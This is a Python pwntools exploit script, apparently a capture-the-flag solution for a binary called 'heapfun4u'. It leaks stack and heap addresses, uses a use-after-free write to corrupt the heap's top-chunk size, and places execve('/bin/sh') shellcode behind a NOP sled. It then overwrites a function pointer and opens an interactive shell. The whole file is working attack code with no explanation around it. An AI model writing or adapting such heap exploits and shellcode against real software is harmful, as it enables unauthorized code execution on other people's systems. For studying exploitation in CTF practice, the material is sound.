from pwn import *


context.arch = "amd64"
# malloc helper
def malloc(p, size):
    p.sendline("A")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("[E]xit\n")

# free helper
def free(p, idx):
    p.sendline("F")
    data = p.recvuntil("Index:")
    p.sendline(str(idx))
    p.recvuntil("[E]xit\n")

    return data

def exit(p):
    p.sendline("E")

def write(p, what, where):
    
    p.sendline("W")
    p.recvuntil("Write where:")
    p.sendline(str(where))
    p.recvuntil("Write what:")
    p.sendline(what)
    p.recvuntil("[E]xit\n")


def get_stack_leak(p):
    p.sendline("N")
    p.recvuntil("go:")
    stack_leak = int(p.recv().split("\n")[0].split("0x")[1],16)
    
    return stack_leak


p = process("./heapfun4u")
#gdb.attach(p, "break *0x400b83\nc")

# get stack ptr
stack_leak = get_stack_leak(p)

print "Stack leak:", hex(stack_leak)

# alloc a big chunk, chunk #1
malloc(p, 0x80)

# free, get heap base
heap_base = int(free(p, 1).split("1) ")[1].split(" -- ")[0],16) & 0xffffffffffffff00
print "Heap base:", hex(heap_base)

#malloc smaller chunk, chunk #2. puts top chunk size in side of chunk 1
malloc(p, 0x40)

# UAF of first chunk we malloc'd, change top chunk size
write(p, "A"*0x34 + "\x00"*0xc + "\xff"*8, 1) 

# 3rd malloc at base+0x50,
malloc_size = 0x4f50 - 0x50
print "mallocing chunk of size", hex(malloc_size)


# malloc a large chunk
malloc(p, malloc_size)

# adds 0x3a030 to ptr
ptr = heap_base +0x50 - 0x3a030

shellcode = asm("sub rsp, 0x1000")
shellcode += asm("mov rax, 0x3b")
shellcode += asm("mov rbx, 0x0068732f6e69622f")
shellcode += asm("push rbx")
shellcode += asm("push rsp")
shellcode += asm("pop rdi")
shellcode += asm("xor rsi, rsi")
shellcode += asm("xor rdx, rdx")
shellcode += asm("syscall")

print "jumping to:", hex(ptr-0x20)
# overwrite some function ptr with the address of our nop sled
write(p, "\x90"*0x200+ shellcode + "\x90" *(0x24c0 - 0x50 - 0x200 - len(shellcode)) + p64(ptr), 3)

# exit, causing our shellcode to execute.
p.sendline("")

p.interactive()
